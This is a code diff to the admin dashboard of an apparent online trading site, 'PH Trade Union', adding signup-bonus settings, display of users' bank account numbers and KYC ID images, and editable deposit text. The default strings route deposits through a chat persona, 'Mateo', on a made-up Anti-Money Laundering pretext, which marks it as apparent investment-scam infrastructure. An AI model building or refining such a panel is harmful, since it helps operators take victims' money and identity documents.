@@ -88,6 +88,12 @@ export const AdminDashboard: React.FC = () => {
   const [brandEmoji, setBrandEmoji] = useState(themeConfig?.logoEmoji || "📈");
   const [brandColor, setBrandColor] = useState(themeConfig?.primaryColor || "blue");
   const [brandFont, setBrandFont] = useState(themeConfig?.fontFamily || "Inter");
+  
+  const [signupBonus, setSignupBonus] = useState((themeConfig?.signupBonus ?? 0).toString());
+  const [depositMessage, setDepositMessage] = useState(themeConfig?.depositMessage || "To comply with Anti-Money Laundering and Cyber-security regulations, manual trade capital ledger replenishment and banking settlement routing is guided coordinates by Mateo.");
+  const [depositButtonText, setDepositButtonText] = useState(themeConfig?.depositButtonText || "MATEO LIVE CHAT (TERMINAL)");
+  const [chatDefaultMessage, setChatDefaultMessage] = useState(themeConfig?.chatDefaultMessage || "Mabuhay! I am Mateo, your Senior Account Relationship Manager here at PH Trade Union. 🇵🇭 If you have any inquiries regarding your wallet balance, making a secure deposit, or processing any pending withdrawals, feel free to ask me here!");
+  
   const [siteMaintenance, setSiteMaintenance] = useState(false);
   const [baseInterestRate, setBaseInterestRate] = useState("10");
   const [minDepositLimit, setMinDepositLimit] = useState("1000");
@@ -536,6 +542,7 @@ export const AdminDashboard: React.FC = () => {
                           <td className="p-4">
                             <p className="font-extrabold text-slate-900 text-[13px]">{u.name}</p>
                             <p className="text-[10px] text-slate-400 font-mono">{u.email} • {u.phone}</p>
+                            <p className="text-[9px] text-slate-400 mt-1 uppercase tracking-tighter">Bank: <span className="font-bold">{u.bankName}</span> • Acc: <span className="font-bold">{u.accountNumber}</span></p>
                           </td>
                           <td className="p-4 font-bold font-sans">
                             <span className="px-2 py-0.5 rounded bg-blue-50 text-blue-700 text-[9px] border border-blue-100 uppercase font-mono tracking-wider">
@@ -1090,12 +1097,19 @@ export const AdminDashboard: React.FC = () => {
                         {u.kycAnswers && (
                           <div className="bg-white border border-slate-150 rounded-lg p-3 space-y-2">
                             <p className="text-[10px] font-mono text-slate-400 font-bold uppercase tracking-wider mb-1">Answers Grid:</p>
-                            {Object.entries(u.kycAnswers).map(([key, val]) => (
-                              <div key={key} className="flex justify-between items-start text-xs border-b border-slate-50 pb-1.5 last:border-b-0">
-                                <span className="font-bold text-slate-500 uppercase text-[10px]">{kycFields.find(f=>f.id === key)?.label || key}:</span>
-                                <span className="text-slate-900 font-extrabold max-w-[280px] break-all">{val}</span>
-                              </div>
-                            ))}
+                            {Object.entries(u.kycAnswers).map(([key, val]) => {
+                              const isImage = typeof val === "string" && val.startsWith("data:image");
+                              return (
+                                <div key={key} className={`flex justify-between text-xs border-b border-slate-50 pb-1.5 last:border-b-0 ${isImage ? 'flex-col gap-2' : 'items-start'}`}>
+                                  <span className="font-bold text-slate-500 uppercase text-[10px]">{kycFields.find(f=>f.id === key)?.label || key}:</span>
+                                  {isImage ? (
+                                    <img src={val} alt="KYC Document" className="max-h-32 object-contain border border-slate-200 rounded" />
+                                  ) : (
+                                    <span className="text-slate-900 font-extrabold max-w-[280px] break-all">{val}</span>
+                                  )}
+                                </div>
+                              );
+                            })}
                           </div>
                         )}
 
@@ -1667,7 +1681,11 @@ export const AdminDashboard: React.FC = () => {
                       siteName: brandName,
                       logoEmoji: brandEmoji,
                       primaryColor: brandColor as any,
-                      fontFamily: brandFont as any
+                      fontFamily: brandFont as any,
+                      signupBonus: Number(signupBonus),
+                      depositMessage,
+                      depositButtonText,
+                      chatDefaultMessage
                     });
                     setBrandSuccess("Branding settings saved successfully! Page elements auto-adapted.");
                     setTimeout(() => setBrandSuccess(""), 2000);
@@ -1727,6 +1745,56 @@ export const AdminDashboard: React.FC = () => {
                         <option value="Playfair Display">Playfair Display (Serif Opulence)</option>
                         <option value="JetBrains Mono">JetBrains Mono (Symmetric Mono)</option>
                       </select>
+                    </div>
+                  </div>
+
+                  <h3 className="font-black text-slate-800 uppercase text-xs tracking-wide mb-2 mt-6 block border-b pb-2">
+                    ⚙️ Operational Defaults
+                  </h3>
+
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                    <div className="space-y-1 block">
+                      <label className="font-extrabold text-slate-755">New User Sign Up Bonus ($)</label>
+                      <input
+                        type="number"
+                        required
+                        value={signupBonus}
+                        onChange={(e) => setSignupBonus(e.target.value)}
+                        className="w-full bg-slate-50 border border-slate-200 outline-none p-2.5 rounded-lg font-bold"
+                      />
+                    </div>
+                    <div className="space-y-1 block">
+                      <label className="font-extrabold text-slate-755">Default Initial Chat Message</label>
+                      <input
+                        type="text"
+                        required
+                        value={chatDefaultMessage}
+                        onChange={(e) => setChatDefaultMessage(e.target.value)}
+                        className="w-full bg-slate-50 border border-slate-200 outline-none p-2.5 rounded-lg"
+                      />
+                    </div>
+                  </div>
+
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                    <div className="space-y-1 block">
+                      <label className="font-extrabold text-slate-755">Deposit Notice Message</label>
+                      <textarea
+                        required
+                        value={depositMessage}
+                        onChange={(e) => setDepositMessage(e.target.value)}
+                        rows={2}
+                        className="w-full bg-slate-50 border border-slate-200 outline-none p-2.5 rounded-lg font-medium text-xs leading-relaxed"
+                      />
+                    </div>
+                    <div className="space-y-1 block">
+                      <label className="font-extrabold text-slate-755">Deposit Action Button Text</label>
+                      <input
+                        type="text"
+                        required
+                        value={depositButtonText}
+                        onChange={(e) => setDepositButtonText(e.target.value)}
+                        className="w-full bg-slate-50 border border-slate-200 outline-none p-2.5 rounded-lg font-bold"
+                      />
                     </div>
                   </div>
 
